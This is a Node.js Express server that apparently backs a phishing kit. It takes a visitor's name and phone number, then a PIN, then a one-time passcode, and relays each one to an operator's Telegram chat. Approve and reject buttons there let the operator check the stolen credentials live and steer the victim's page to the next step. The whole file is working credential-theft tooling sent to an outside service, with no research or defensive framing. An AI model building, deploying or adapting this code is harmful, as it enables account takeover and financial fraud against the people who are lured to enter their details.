require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ---------------- MEMORY ----------------
const passwordRequests = {};
const pinRequests = {};
const otpRequests = {};
const blockedRequests = {};
const requestMeta = {};

// ---------------- BOT SETUP ----------------
const bots = [];

Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;

  const i = match[1];

  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];

  if (token && chatId) {
    bots.push({
      botId: `bot${i}`,
      token,
      chatId
    });
  }
});

console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

async function sendTelegram(bot, text, buttons = []) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${bot.token}/sendMessage`,
      {
        chat_id: bot.chatId,
        text,
        reply_markup: buttons.length
          ? { inline_keyboard: buttons }
          : undefined
      }
    );
  } catch (e) {
    console.log("Telegram error:", e.message);
  }
}

async function answerCallback(bot, id) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
      { callback_query_id: id }
    );
  } catch {}
}

// ---------------- BOT ENTRY ----------------
app.get('/bot/:botId', (req, res) => {
  const bot = bots.find(b => b.botId === req.params.botId);
  if (!bot) return res.status(404).send('Invalid bot');

  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ---------------- STEP 1: PHONE SUBMIT ----------------
app.post('/submit-password', async (req, res) => {
  try {
    const { name = "User", phone, botId } = req.body;

    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();

    passwordRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    await sendTelegram(
      bot,
`📲 NEW LOGIN ATTEMPT
👤 Name: ${name}
📞 Phone: ${phone}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Approve', callback_data: `pass_ok:${requestId}` },
          { text: '❌ Reject', callback_data: `pass_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });

  } catch (e) {
    console.log(e.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ---------------- STEP 1 CHECK ----------------
app.get('/check-password/:id', (req, res) => {
  const result = passwordRequests[req.params.id];

  if (result === true) return res.json({ redirect: 'pin' });
  if (result === false) return res.json({ approved: false });

  res.json({ approved: null });
});

// ---------------- STEP 2 PIN ----------------
app.post('/submit-pin', async (req, res) => {
  try {
    const { name = "User", phone, pin = "N/A", botId } = req.body;

    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();

    pinRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    await sendTelegram(
      bot,
`🔐 PIN ENTRY
👤 ${name}
📞 ${phone}
🔢 ${pin}
🆔 ${requestId}`,
      [
        [
          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });

  } catch (e) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ---------------- STEP 2 CHECK ----------------
app.get('/check-pin/:id', (req, res) => {
  const result = pinRequests[req.params.id];

  if (blockedRequests[req.params.id]) {
    return res.json({ blocked: true });
  }

  if (result === true) return res.json({ redirect: 'code' });
  if (result === false) return res.json({ approved: false });

  res.json({ approved: null });
});

// ---------------- STEP 3 OTP ----------------
app.post('/submit-otp', async (req, res) => {
  try {
    const { name = "User", phone, otp = "N/A", botId } = req.body;

    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();

    otpRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    await sendTelegram(
      bot,
`🔐 OTP ENTRY
👤 ${name}
📞 ${phone}
🔢 ${otp}
🆔 ${requestId}`,
      [
        [
          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });

  } catch (e) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ---------------- STEP 3 CHECK ----------------
app.get('/check-otp/:id', (req, res) => {
  const result = otpRequests[req.params.id];

  if (result === true) return res.json({ redirect: 'success' });
  if (result === false) return res.json({ approved: false });

  res.json({ approved: null });
});

// ---------------- TELEGRAM CALLBACK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.sendStatus(404);

  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  const [action, requestId] = cb.data.split(':');

  if (action === 'pass_ok') passwordRequests[requestId] = true;
  if (action === 'pass_bad') passwordRequests[requestId] = false;

  if (action === 'pin_ok') pinRequests[requestId] = true;
  if (action === 'pin_bad') pinRequests[requestId] = false;

  if (action === 'otp_ok') otpRequests[requestId] = true;
  if (action === 'otp_bad') otpRequests[requestId] = false;

  await answerCallback(bot, cb.id);

  res.sendStatus(200);
});

// ---------------- START ----------------
app.listen(PORT, () => {
  console.log(`🚀 Server running on ${PORT}`);
});